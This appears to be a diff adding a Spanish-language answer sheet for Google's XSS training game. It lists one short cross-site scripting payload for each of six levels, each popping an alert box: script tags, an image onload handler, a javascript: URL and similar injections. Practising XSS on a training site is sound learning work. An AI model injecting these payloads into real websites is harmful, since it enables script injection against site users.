@@ -1,0 +1,26 @@
+Respuestas para xss-game de google
+
+https://xss-game.appspot.com/
+
+1 ejercicio
+<script> alert('XSS') </script>
+
+2 ejercicio
+
+<img src="https://cualquiercosa.png" onload="alert('XSS')" />
+
+3 ejercicio
+
+onload='alert("xss")'
+
+4 ejercicio
+
+;alert('XSS');
+
+5 ejercicio
+
+javascript:alert('XSS')
+
+6
+data:text/javascript,alert('XSS')
+
